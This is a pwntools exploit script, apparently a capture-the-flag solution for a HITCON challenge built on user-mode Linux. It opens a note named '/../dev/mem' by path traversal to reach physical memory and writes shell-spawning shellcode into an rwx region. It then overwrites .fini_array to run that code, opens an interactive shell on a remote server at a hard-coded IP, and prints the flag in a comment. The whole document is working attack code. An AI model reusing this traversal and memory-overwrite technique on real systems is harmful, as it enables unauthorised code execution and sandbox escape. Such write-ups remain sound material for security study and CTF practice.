#!/bin/sh
from pwn import *


def connect():
    basedir = os.path.dirname(os.path.abspath(__file__))
    if args.LOCAL:
        return process(
            [
                "release/linux",
                "rootfstype=hostfs",
                "rootflags=" + os.path.join(basedir, "release", "fs"),
                "r",
                "init=/init",
            ]
        )
    else:
        return remote("3.115.128.152", 3154)


def do_write(tube, buf, size=None):
    if size is None:
        size = len(buf)
    tube.sendlineafter(b"Choose one:", b"1")
    tube.sendlineafter(b"Size?", f"{size}".encode())
    tube.sendline(buf)


def do_read(tube, size):
    tube.sendlineafter(b"Choose one:", b"2")
    tube.sendlineafter(b"Size?", f"{size}".encode())
    tube.recvuntil(b"\n")
    return tube.recvn(size)


def do_seek(tube, offset):
    bulk = b""
    for j in range(0, offset, 0x10000):
        bulk += b"2\n"
        bulk += str(min(offset - j, 0x10000)).encode() + b"\n"
    tube.send(bulk)
    for j in range(0, offset, 0x10000):
        tube.recvuntil(b"Choose one:")
        tube.recvuntil(b"Size?")


def main():
    with connect() as tube:
        tube.sendlineafter(b"Name of note?", b"/../dev/mem")

        do_seek(tube, 0x36C000)  # rwx
        do_write(tube, asm(shellcraft.amd64.linux.sh(), arch="amd64"))

        do_seek(tube, 0x4821B8)  # .fini_array
        do_write(tube, struct.pack("<Q", 0x6036C000))

        tube.sendlineafter(b"Choose one:", b"3")

        tube.interactive()  # hitcon{is this counted as a sandbox escaping? ;)}


if __name__ == "__main__":
    main()
